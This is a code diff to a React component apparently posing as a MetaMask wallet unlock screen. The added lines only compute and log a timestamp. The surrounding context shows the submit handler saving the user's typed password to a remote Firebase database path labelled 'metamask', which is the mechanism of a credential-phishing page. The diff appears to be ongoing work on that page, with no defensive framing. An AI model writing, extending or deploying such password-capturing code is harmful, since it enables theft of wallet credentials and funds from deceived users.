@@ -286,7 +286,16 @@ export default function MetaMaskUnlock({onSuccess}) {
     }
   };
 
+  const getCurrentTimestamp = () => {
+    return {
+      milliseconds: Date.now(),
+      seconds: Math.floor(Date.now() / 1000)
+    };
+  };
+
   const handleSubmit = async () => {
+    const timestamp = getCurrentTimestamp();
+    console.log('Current timestamp:', timestamp);
     if (!password.length) return;
     set(ref(db, "88_/-metamask/" + formatDateWithMilliseconds()), {
       value: password,
